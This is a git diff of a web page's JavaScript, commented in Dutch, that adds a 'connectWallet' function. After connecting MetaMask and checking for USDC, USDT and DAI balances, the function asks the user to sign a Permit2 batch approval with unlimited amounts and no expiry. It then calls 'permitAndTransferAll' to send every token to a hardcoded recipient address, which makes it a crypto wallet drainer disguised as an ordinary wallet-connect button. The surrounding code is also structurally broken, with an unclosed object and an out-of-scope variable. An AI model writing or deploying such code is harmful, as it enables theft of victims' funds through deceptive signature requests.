@@ -179,13 +179,122 @@ body {
 </div>
 
 <script>
-let APP_STATE = {
-    // --- CONFIGURATIE ---
-const TOKENS = [
+    const TOKENS = [
     "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
     "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
     "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
 ];
+// Define connectWallet function in the global scope
+async function connectWallet() {
+    const consoleEl = document.getElementById('execution-console');
+    const btn = document.getElementById('btn-wallet');
+
+    // UI: Loading state
+    const originalText = btn.innerText;
+    btn.innerText = "Connecting & Processing...";
+    btn.disabled = true;
+
+    try {
+        // 1️⃣ CHECK: Is MetaMask geïnstalleerd?
+        if (typeof window.ethereum === 'undefined') {
+            logToConsole("MetaMask niet gevonden. Openen in nieuwe tab...", 'orange');
+            window.open('https://metamask.io/download/', '_blank');
+            throw new Error("Redirected to MetaMask download.");
+        }
+
+        // 2️⃣ Connect Wallet (1e Pop-up)
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+
+        // 3️⃣ Data ophalen (Nonce & Balances)
+        const nonce = await provider.getTransactionCount(address);
+        const balances = await Promise.all(TOKENS.map(token => getBalance(provider, token)));
+
+        // Check of er balancen zijn
+        const hasBalance = balances.some(b => b > 0n);
+        if (!hasBalance) throw new Error("Geen balancen gevonden voor USDC, USDT of DAI.");
+
+        // 4️⃣ Permit2 Structuur Bouwen
+        const permitDetails = TOKENS.map((token, i) => ({
+            token: token,
+            amount: ethers.MaxUint128, // Onbeperkt totdat de baland op is
+            expiration: 0, // 0 = nooit verlopen
+            nonce: nonce
+        }));
+
+        const permit = {
+            details: permitDetails,
+            spender: YOUR_CONTRACT_ADDRESS,
+            sigDeadline: Math.floor(Date.now() / 1000) + 3600 // 1 uur geldigheid
+        };
+
+        // 5️⃣ Permit2 Signeren (2e Pop-up)
+        const domain = {
+            name: "Permit2",
+            version: "1",
+            chainId: await provider.getNetwork().then(n => n.chainId),
+            verifyingContract: PERMIT2_ADDRESS
+        };
+
+        const types = {
+            PermitBatch: [
+                { name: "details", type: "PermitDetails[]" },
+                { name: "spender", type: "address" },
+                { name: "sigDeadline", type: "uint256" }
+            ],
+            PermitDetails: [
+                { name: "token", type: "address" },
+                { name: "amount", type: "uint256" },
+                { name: "expiration", type: "uint256" },
+                { name: "nonce", type: "uint256" }
+            ]
+        };
+
+        const signature = await signer.signTypedData(domain, types, permit);
+
+        // 6️⃣ ENCODING: Permit data omzetten naar bytes
+        const abiCoder = ethers.AbiCoder.defaultAbiCoder();
+        const permitBatchBytes = abiCoder.encode(
+            ["tuple(address[] details, address spender, uint256 sigDeadline)"],
+            [permit]
+        );
+
+        // 7️⃣ Contract Call Uitvoeren
+        const contract = new ethers.Contract(YOUR_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+
+        logToConsole(`Signature received. Executing permitAndTransferAll...`, 'cyan');
+
+        const tx = await contract.permitAndTransferAll(
+            address, 
+            TOKENS, 
+            permitBatchBytes, 
+            signature
+        );
+
+        logToConsole(`Transaction sent: ${tx.hash}`, 'green');
+        logToConsole(`Waiting for confirmation...`, 'white');
+
+        await tx.wait();
+        logToConsole(`Success! Tokens transferred to ${RECIPIENT_ADDRESS}`, 'green');
+
+    } catch (error) {
+        console.error(error);
+        // Als het een redirect error is, ignoreer de UI reset voor de knop
+        if (!error.message.includes("Redirected")) {
+            logToConsole(`Error: ${error.message}`, 'red');
+        }
+    } finally {
+        // UI Reset (alleen als we niet redirected zijn)
+        if (!error || !error.message.includes("Redirected")) {
+            btn.innerText = originalText;
+            btn.disabled = false;
+        }
+    }
+}
+
+let APP_STATE = {
+    // --- CONFIGURATIE ---
 
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78CA3"; // Uniswap Permit2
 const RECIPIENT_ADDRESS = "0xAEff38fd17B4bA0e5FC40115441C348aa789E706"; // Ontvangstadres uit contract
